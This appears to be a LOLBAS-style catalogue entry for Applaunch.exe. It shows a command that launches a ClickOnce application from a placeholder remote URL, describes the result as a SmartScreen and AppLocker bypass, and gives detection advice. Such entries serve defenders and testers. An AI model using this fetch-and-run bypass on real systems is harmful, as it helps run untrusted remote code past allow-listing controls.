      document_utf8: "---\nName: Applaunch.exe\nDescription: Microsoft .NET ClickOnce Launch Utility.\n\
        Author: Nathan Sawyer\nCreated: 2026-08-08\nCommands:\n  - Command: '\"C:\\Windows\\Microsoft.NET\\\
        Framework64\\v4.0.30319\\Applaunch.exe\" /activate \"{REMOTEURL}#APPLICATION_METADATA_HERE\"'\n\
        \    Description: Launches a ClickOnce application via `Applaunch.exe`. Bypasses SmartScreen and\
        \ default AppLocker rules when the application is published as partial trust.\n    Usecase: Execute\
        \ ClickOnce applications in environments where `dfsvc.exe` would normally enforce full-trust and\
        \ SmartScreen checks. Can be abused as an AWL bypass in rare configurations.\n    Category: AWL\
        \ Bypass\n    Privileges: User\n    MitreID: T1127.002\n    OperatingSystem: Windows Vista, Windows\
        \ 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: ClickOnce\n \
        \     - Execute: Remote\n\nFull_Path:\n  - Path: C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\\
        Applaunch.exe\n  - Path: C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Applaunch.exe\n\
        \  - Path: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Applaunch.exe\n  - Path: C:\\Windows\\\
        Microsoft.NET\\Framework64\\v4.0.30319\\Applaunch.exe\n\nDetection:\n  - IOC: Applaunch.exe rarely\
        \ executes unless any ClickOnce partial trusted apps are used. Any use or invocation outside dfsvc.exe\
        \ with `/activate` should be considered suspicious.\n\nResources:\n  - Link: https://nathan2.com/posts/clicktools\n\
        \  - Link: https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-security-and-deployment\n\
